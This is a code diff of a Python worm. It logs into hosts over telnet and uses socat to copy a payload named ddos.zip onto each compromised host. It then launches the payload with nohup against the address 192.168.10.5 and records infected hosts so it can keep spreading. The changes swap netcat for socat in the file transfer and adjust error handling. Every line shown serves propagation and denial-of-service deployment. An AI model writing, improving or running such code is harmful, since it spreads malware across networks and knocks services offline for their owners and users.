@@ -46,21 +46,18 @@ def replicate(tn):
     try:
         # Open nc connection to receive the file
         random_port = random.randint(5000, 5100)
-        print(random_port)
-        tn.write(b"nc -l -p {} > ddos.zip\n")
-        netcat_command = "nc -w 5 {} {} < ddos.zip".format(tn.host, random_port)
-
-        process = subprocess.Popen(netcat_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        process.kill()
-
-        # Execute script
+        command = "socat -u TCP-LISTEN:{},reuseaddr OPEN:ddos.zip,creat,trunc\n".format(random_port)
+        tn.write(bytes(command, encoding="ascii"))
+        time.sleep(5)
+        os.system("socat -u FILE:ddos.zip TCP:{}:{}".format(tn.host, random_port))
+        time.sleep(5)
         tn.write(b"nohup python3 ddos.zip 192.168.10.5 5 &\n")
-        tn.write(b"exit\r\n")
-        tn.close()   
+        time.sleep(1)
+        tn.write(b"exit\n")
     except EOFError:
         print("Connection to host lost")
-    #except: 
-    #    print("Replication error")
+    except: 
+        print("Replication error")
 
 
 def network_replicate():
@@ -90,5 +87,6 @@ def network_replicate():
                 if tn:
                     print("Login successful")
                     replicate(tn)
+                    tn.close()
                     print("Replication successful")
                     known_hosts.append(host)
